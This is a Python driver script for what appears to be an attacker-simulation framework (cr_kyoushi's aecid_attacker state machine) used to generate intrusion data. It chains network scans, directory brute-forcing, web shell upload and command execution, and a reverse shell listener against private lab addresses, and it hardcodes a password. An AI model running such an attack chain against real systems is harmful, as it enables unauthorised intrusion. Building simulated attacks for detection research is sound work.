import re

from pathlib import Path

import requests

from bs4 import BeautifulSoup

from cr_kyoushi.simulation.logging import (
    LoggingConfig,
    configure_logging,
    get_logger,
)
from cr_kyoushi.simulation.model import LogLevel
from cr_kyoushi.statemachines.aecid_attacker.actions import (
    Dirb,
    ExecShellCommand,
    ExecWebShellCommand,
    NmapDNSBrute,
    NmapHostScan,
    NmapServiceScan,
    OpenPTY,
    ShellChangeUser,
    StartReverseShellListener,
    Traceroute,
    UploadWebShell,
    WaitReverseShellConnection,
    close_reverse_shell,
    execute,
)
from cr_kyoushi.statemachines.aecid_attacker.context import ContextModel


def main():
    context = ContextModel()
    configure_logging(LoggingConfig(level=LogLevel.DEBUG))
    log = get_logger()
    nmap_host_scan = NmapHostScan(["192.168.42.0/24"])
    nmap_dns_brute = NmapDNSBrute(["127.0.0.53"], "local")
    nmap_service_scan = NmapServiceScan(["192.168.42.0/24"], extra_args=["-vvvvvvvv"])
    traceroute = Traceroute("127.0.0.1")
    dirb = Dirb(urls=["https://172.16.0.254"])
    upload_webshell = UploadWebShell(
        "https://172.16.0.254", Path("/home/frankm/Pictures/empty.jpg")
    )
    exec_webshell = ExecWebShellCommand(["ls", "-ls"])
    start_reverse_shell = StartReverseShellListener(port=9999)
    wait_reverse_shell = WaitReverseShellConnection()
    open_pty = OpenPTY()
    change_user = ShellChangeUser(username="frankm", password="asd")

    exec_top = ExecShellCommand(cmd="top", expect_after=re.compile("avail Mem"))
    exec_sigint = ExecShellCommand(cmd="\x03")
    # execute(["ls"], log)

    # traceroute(log, "test", context, "test")

    # nmap_dns_brute(log, "test", context, "test")

    # nmap_host_scan(log, "test", context, "test")

    # nmap_service_scan(log, "test", context, "test")

    # dirb(log, "test", context, "test")

    # upload_webshell(log, "test", context, "test")
    # exec_webshell(log, "test", context, "test")

    start_reverse_shell(log, "test", context, "test")
    input("wait")
    wait_reverse_shell(log, "test", context, "test")
    open_pty(log, "test", context, "test")
    input("wait")
    # change_user(log, "test", context, "test")
    exec_top(log, "test", context, "test")
    input("wait")
    # exec_sigint(log, "test", context, "test")
    close_reverse_shell(log, "test", context, "test")
    input("wait")


if __name__ == "__main__":
    main()
